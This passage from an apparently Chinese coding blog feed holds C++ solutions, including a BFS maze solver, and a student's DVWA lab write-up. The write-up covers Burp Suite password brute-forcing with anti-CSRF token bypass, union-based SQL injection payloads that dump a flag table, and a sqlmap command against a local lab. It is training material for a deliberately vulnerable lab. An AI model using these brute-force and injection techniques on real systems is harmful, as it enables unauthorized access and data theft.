	 <span class="hljs-keyword">if</span>(<span class="hljs-built_in">check</span>(l+<span class="hljs-number">1</span>,a)) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
&#125;

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	cin&gt;&gt;n;
	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)
	&#123;
		cin&gt;&gt;s[i];
	&#125;
	cin&gt;&gt;m;
	<span class="hljs-keyword">if</span>(<span class="hljs-built_in">check</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))
	cout&lt;&lt;<span class="hljs-string">&quot;YES&quot;</span>;
	<span class="hljs-keyword">else</span>
	cout&lt;&lt;<span class="hljs-string">&quot;NO&quot;</span>; 
	
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>

]]></content>
      <categories>
        <category>c++</category>
      </categories>
  </entry>
  <entry>
    <title>迷宫问题</title>
    <url>/2020/03/20/%E8%BF%B7%E5%AE%AB%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h1 id="迷宫问题"><a href="#迷宫问题" class="headerlink" title="迷宫问题"></a>迷宫问题</h1><span id="more"></span>

<h2 id="原题"><a href="#原题" class="headerlink" title="原题"></a>原题</h2><p>题目描述</p>
<p>小明置身于一个迷宫，请你帮小明找出从起点到终点的最短路程。<br> 小明只能向上下左右四个方向移动。</p>
<p>输入</p>
<p>输入包含多组测试数据。输入的第一行是一个整数T，表示有T组测试数据。<br> 每组输入的第一行是两个整数N和M（1&lt;&#x3D;N,M&lt;&#x3D;100）。<br> 接下来N行，每行输入M个字符，每个字符表示迷宫中的一个小方格。<br> 字符的含义如下：<br>‘S’：起点<br>‘E’：终点<br>‘-’：空地，可以通过<br>‘#’：障碍，无法通过<br> 输入数据保证有且仅有一个起点和终点。</p>
<p>输出</p>
<p>对于每组输入，输出从起点到终点的最短路程，如果不存在从起点到终点的路，则输出-1。</p>
<h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><pre><code>1
5 5
s-###
-----
##---
E#---
---##
</code></pre>
<h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><pre><code>9
</code></pre>
<h2 id="解决代码"><a href="#解决代码" class="headerlink" title="解决代码"></a>解决代码</h2><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;queue&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;
<span class="hljs-type">int</span> de[<span class="hljs-number">100</span>][<span class="hljs-number">100</span>];<span class="hljs-comment">//计步数组  记录走到这个位置所需的步数 不能走到的位置标记为-1 </span>
<span class="hljs-type">char</span> map[<span class="hljs-number">100</span>][<span class="hljs-number">100</span>];  <span class="hljs-comment">//用于存放迷宫地图 </span>
<span class="hljs-keyword">typedef</span> pair&lt;<span class="hljs-type">int</span>,intP;  //坐标
<span class="hljs-type">int</span> to[2][4]=&#123;1,-1,0,0,0,0,1,-1&#125;;  //在当前坐标下能走的四个方向
<span class="hljs-type">int</span> sx,ex,sy,ey;  //(sx,sy)为起点坐标  （ex,ey）为终点坐标
<span class="hljs-type">int</span> x,y,nx,ny; //(x,y)为函数中当前位置坐标   （nx,ny)为接下来能到达的坐标 
<span class="hljs-type">int</span> r,l;  //r为行数 l为列数 
<span class="hljs-type">int</span> bfs()
&#123;
	memset(de,-1,<span class="hljs-keyword">sizeof</span>(de));
	queue&lt;Pqu;
	qu.push(P(sx,sy));   //将起点坐标放入队头 
	de[sx][sy]=0;
	<span class="hljs-keyword">while</span>(!qu.empty()) 
	&#123;
		P p=qu.front();   //取出队头坐标 
		qu.pop() ;//删除对头及走过的坐标 
		x=p.first,y=p.second; 
		<span class="hljs-keyword">if</span>(x==ex&amp;&amp;y==ey) <span class="hljs-keyword">break</span>; //到达终点 跳出循环		
	 	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=0;i&lt;4;i++)
		&#123;
			nx=x+to[0][i];//开始向四个方向移动 
			ny=y+to[1][i];			
				<span class="hljs-keyword">if</span>(nx&gt;=0&amp;&amp;nx&lt;r&amp;&amp;ny&gt;=<span class="hljs-number">0</span>&amp;&amp;ny&lt;l&amp;&amp;map[nx][ny]!=<span class="hljs-string">&#x27;#&#x27;</span>&amp;&amp;de[nx][ny]==<span class="hljs-number">-1</span>)
	 <span class="hljs-comment">//判断是否越界 以及是否能走  排除走过的路 </span>
	 &#123;
	 	 qu.<span class="hljs-built_in">push</span>(<span class="hljs-built_in">P</span>(nx,ny));  <span class="hljs-comment">//将能走的坐标放入队列 之后依次删除 </span>
						 de[nx][ny]=de[x][y]+<span class="hljs-number">1</span>;  <span class="hljs-comment">//步数加一 </span>
					  &#125; 				  
			&#125;
	&#125;
	<span class="hljs-keyword">if</span>(de[ex][ey]==<span class="hljs-number">-1</span>)  <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;  <span class="hljs-comment">//终点的记步数组为-1 及不能到达终点 </span>
	<span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> de[ex][ey]; 
&#125; 
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-type">int</span> n,i,j;
	<span class="hljs-keyword">while</span>(cin&gt;&gt;n)&#123;
		<span class="hljs-keyword">while</span>(n--)&#123;
			cin&gt;&gt;r&gt;&gt;l;
			<span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;r;i++)&#123;
				<span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;l;j++)&#123; 
				cin&gt;&gt;map[i][j];
				<span class="hljs-keyword">if</span>(map[i][j]==<span class="hljs-string">&#x27;S&#x27;</span>) <span class="hljs-comment">//记录起点坐标 </span>
				 &#123;
					sx=i,sy=j;
				 &#125; 
				 <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(map[i][j]==<span class="hljs-string">&#x27;E&#x27;</span>)  <span class="hljs-comment">//记录终点坐标 </span>
				 &#123;
				 	ex=i,ey=j;
				 &#125;
				&#125;
			&#125;
			cout&lt;&lt;<span class="hljs-built_in">bfs</span>()&lt;&lt;endl;
		&#125;
	&#125;
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>

]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>bfs</tag>
      </tags>
  </entry>
  <entry>
    <title>网安作业2</title>
    <url>/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/</url>
    <content><![CDATA[<h1 id="DVWA实验"><a href="#DVWA实验" class="headerlink" title="DVWA实验"></a>DVWA实验</h1><p>一下都是基于low,mid,high级别的实验，为了方便叙述，提前在数据库中建了一个flag表</p>
<h2 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h2><p>使用工具 ：bp</p>
<p>使用材料：密码字典</p>
<h3 id="bp的四种爆破攻击类型"><a href="#bp的四种爆破攻击类型" class="headerlink" title="bp的四种爆破攻击类型"></a>bp的四种爆破攻击类型</h3><h4 id="第一种："><a href="#第一种：" class="headerlink" title="第一种："></a>第一种：</h4><p>Sniper标签 这个是我们最常用的，Sniper是狙击手的意思。这个模式会使用单一的payload【就是导入字典的payload】组。它会针对每个position中$$位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行测试。攻击中的请求总数应该是position数量和payload数量的乘积。</p>
<h4 id="第二种："><a href="#第二种：" class="headerlink" title="第二种："></a>第二种：</h4><p>Battering ram – 这一模式是使用单一的payload组。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。简单说就是一个playload字典同时应用到多个position中</p>
<h4 id="第三种："><a href="#第三种：" class="headerlink" title="第三种："></a>第三种：</h4><p>Pitchfork – 这一模式是使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。比如：position中A处有a字典，B处有b字典，则a【1】将会对应b【1】进行attack处理，这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量</p>
<h4 id="第四种："><a href="#第四种：" class="headerlink" title="第四种："></a>第四种：</h4><p>Cluster bomb – 这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。比如：position中A处有a字典，B处有b字典，则两个字典将会循环搭配组合进行attack处理这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。</p>
<h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><p>1.抓包–&gt;ctrl+I –&gt;标记要爆破的参数，这里直接爆破password</p>
<p><img src="https://i.loli.net/2020/11/26/pEXImJf8eL1R7xq.png" alt="int1.png"></p>
<p>2.选择要加载的密码字典，可以使用自己准备的密码字典，也可以使用bp自带的密码字典，但是最重要的是要包含正确达到密码</p>
<p><img src="https://i.loli.net/2020/11/26/7hkFZm134qy8auw.png" alt="int3.png"></p>
<p><img src="https://i.loli.net/2020/11/26/SY9gXKPaRDoJ16k.png" alt="int2.png"></p>
<p>3.开始爆破 ，根据响应包的长度筛选出正确密码的响应包，这里只有当密码为password的时候响应包的长度为4743,所以password就是争取密码。</p>
<p><img src="https://i.loli.net/2020/11/26/GOsWwrvcobAxEpV.png" alt="int4.png"></p>
<h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Login&#x27;</span> ] ) ) &#123;
    <span class="hljs-comment">// Sanitise username input</span>
    <span class="hljs-variable">$user</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;username&#x27;</span> ];
    <span class="hljs-variable">$user</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$user</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));

    <span class="hljs-comment">// Sanitise password input</span>
    <span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password&#x27;</span> ];
    <span class="hljs-variable">$pass</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));
    <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass</span> );

    <span class="hljs-comment">// Check the database</span>
    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="hljs-subst">$user</span>&#x27; AND password = &#x27;<span class="hljs-subst">$pass</span>&#x27;;&quot;</span>;
    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );

    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$result</span> &amp;&amp; <span class="hljs-title function_ invoke__">mysqli_num_rows</span>( <span class="hljs-variable">$result</span> ) == <span class="hljs-number">1</span> ) &#123;
        <span class="hljs-comment">// Get users details</span>
        <span class="hljs-variable">$row</span>    = <span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>( <span class="hljs-variable">$result</span> );
        <span class="hljs-variable">$avatar</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;avatar&quot;</span>];

        <span class="hljs-comment">// Login successful</span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Welcome to the password protected area <span class="hljs-subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=\&quot;<span class="hljs-subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;
    &#125;
    <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-comment">// Login failed</span>
        <span class="hljs-title function_ invoke__">sleep</span>( <span class="hljs-number">2</span> );
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;
    &#125;

    ((<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);
&#125;

<span class="hljs-meta">?&gt;</span></code></pre>



<p>与low级别相比较，只是增加了回显的时间，所以还是可以使用low级别的方法直接爆破，不过花费的时间相对会长一点。</p>
<p>1.火狐浏览器打开代理抓包后发到爆破模块，添加爆破的变量。</p>
<p>2.加载密码字典进行爆破。</p>
<p>3.根据响应包的长度确定正确密码。</p>
<h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Login&#x27;</span> ] ) ) &#123;
    <span class="hljs-comment">// Check Anti-CSRF token</span>
    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );

    <span class="hljs-comment">// Sanitise username input</span>
    <span class="hljs-variable">$user</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;username&#x27;</span> ];
    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$user</span> );
    <span class="hljs-variable">$user</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$user</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));

    <span class="hljs-comment">// Sanitise password input</span>
    <span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password&#x27;</span> ];
    <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$pass</span> );
    <span class="hljs-variable">$pass</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));
    <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass</span> );

    <span class="hljs-comment">// Check database</span>
    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="hljs-subst">$user</span>&#x27; AND password = &#x27;<span class="hljs-subst">$pass</span>&#x27;;&quot;</span>;
    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );

    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$result</span> &amp;&amp; <span class="hljs-title function_ invoke__">mysqli_num_rows</span>( <span class="hljs-variable">$result</span> ) == <span class="hljs-number">1</span> ) &#123;
        <span class="hljs-comment">// Get users details</span>
        <span class="hljs-variable">$row</span>    = <span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>( <span class="hljs-variable">$result</span> );
        <span class="hljs-variable">$avatar</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;avatar&quot;</span>];

        <span class="hljs-comment">// Login successful</span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Welcome to the password protected area <span class="hljs-subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=\&quot;<span class="hljs-subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;
    &#125;
    <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-comment">// Login failed</span>
        <span class="hljs-title function_ invoke__">sleep</span>( <span class="hljs-title function_ invoke__">rand</span>( <span class="hljs-number">0</span>, <span class="hljs-number">3</span> ) );
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;
    &#125;

    ((<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);
&#125;

<span class="hljs-comment">// Generate Anti-CSRF token</span>
<span class="hljs-title function_ invoke__">generateSessionToken</span>();

<span class="hljs-meta">?&gt;</span>
</code></pre>

<p>审计代码后可以发现使用了随机token机制来防止CSRF，从而在一定程度上防止了重放攻击，增加了爆破难度，但是任然可以使用bp的爆破模块</p>
<p>1.抓包，发包到爆破模块并添加参数，这次需要添加两个参数，设置 password和user_token为变量</p>
<p><img src="https://i.loli.net/2020/11/05/WFYoqKklaEOwHtn.png" alt="intr3-1.png"></p>
<p>2.攻击类型选择pitchfork，意思是草叉模式（Pitchfork ）——它可以使用多组Payload集合，在每一个不同的Payload标志位置上（最多20个），遍历所有的Payload。举例来说，如果有两个Payload标志位置，第一个Payload值为A和B，第二个Payload值为C和D，则发起攻击时，将共发起两次攻击，第一次使用的Payload分别为A和C，第二次使用的Payload分别为B和D。</p>
<p><img src="https://i.loli.net/2020/11/05/tr4dB1SzEHxY9UD.png" alt="intr3-2.png"></p>
<p>3.设置参数，在option选项卡中将攻击线程thread设置为1，因为Recursive_Grep模式不支持多线程攻击，然后选择Grep-Extract，意思是用于提取响应消息中的有用信息，点击Add，如下图进行设置，最后将Redirections设置为Always</p>
<p><img src="https://i.loli.net/2020/11/05/d5qmsRVpu3kZ7Gr.png" alt="intr3-3.png"></p>
<p>4.设置payload，第一个参数是密码与之前两次一样，加载密码字典即可，第二token参数选择Recursive grep，然后将options中的token作为第一次请求的初始值。</p>
<p><img src="https://i.loli.net/2020/11/05/cQdZAUqgMDO4eJI.png" alt="intr3-4.png"></p>
<p>5.start attack,还是根据响应包长度的不同找到包含真正密码的请求包，获取正确密码。</p>
<p><img src="https://i.loli.net/2020/11/05/tpMjbBah95clPK8.png" alt="intr3-5.png"></p>
<h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><h3 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_SESSION</span> [ <span class="hljs-string">&#x27;id&#x27;</span> ] ) ) &#123;
    <span class="hljs-comment">// Get input</span>
    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];

    <span class="hljs-comment">// Check database</span>
    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 1;&quot;</span>;
    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>], <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27;</span> );
    <span class="hljs-comment">// Get results</span>
    <span class="hljs-keyword">while</span>( <span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>( <span class="hljs-variable">$result</span> ) ) &#123;
        <span class="hljs-comment">// Get values</span>
        <span class="hljs-variable">$first</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;first_name&quot;</span>];
        <span class="hljs-variable">$last</span>  = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;last_name&quot;</span>];

        <span class="hljs-comment">// Feedback for end user</span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;ID: <span class="hljs-subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="hljs-subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="hljs-subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;
    &#125;

    ((<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);        
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>

<p><code>SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39; LIMIT 1;</code>注入点就在这句代码中</p>
<h4 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h4><h5 id="1-判断注入类型"><a href="#1-判断注入类型" class="headerlink" title="1.判断注入类型"></a>1.判断注入类型</h5><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span> #

<span class="hljs-number">1</span><span class="hljs-comment">&#x27; or 1=1 #</span></code></pre>

<p>可知是字符型注入</p>
<h5 id="2-判断多少字段数"><a href="#2-判断多少字段数" class="headerlink" title="2.判断多少字段数"></a>2.判断多少字段数</h5><pre><code class="hljs crmsh"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">#</span></code></pre>

<p>报错</p>
<pre><code class="hljs crmsh"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-comment">#</span></code></pre>

<p>显示正常，说明只有2个字段</p>
<h5 id="3-确认显示顺序"><a href="#3-确认显示顺序" class="headerlink" title="3.确认显示顺序"></a>3.确认显示顺序</h5><p><img src="https://i.loli.net/2020/11/06/isw8SKDdjWlv5AJ.png" alt="sqll-2.png"></p>
<p>两个位置都可以使用</p>
<h5 id="4-union查询"><a href="#4-union查询" class="headerlink" title="4.union查询"></a>4.union查询</h5><pre><code class="hljs q"><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=database()#</code></pre>

<p><img src="https://i.loli.net/2020/11/06/mudnW957ZotUhNM.png" alt="sqll-3.png"></p>
<pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-meta">#</span></code></pre>

<p><img src="https://i.loli.net/2020/11/06/UtxVjBMkiGb534Z.png" alt="sqll-4.png"></p>
<pre><code class="hljs capnproto"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,group_concat(fl4g) <span class="hljs-keyword">from</span> flag <span class="hljs-comment">#</span></code></pre>

<p><img src="https://i.loli.net/2020/11/06/BNp8ZiPgy2MdHvC.png" alt="sqll-1.png"></p>
<h4 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h4><pre><code class="hljs stylus">python2 sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> <span class="hljs-attr">--cookie</span>=<span class="hljs-string">&quot;security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1&quot;</span> <span class="hljs-attr">--batch</span> <span class="hljs-attr">--dbs</span>

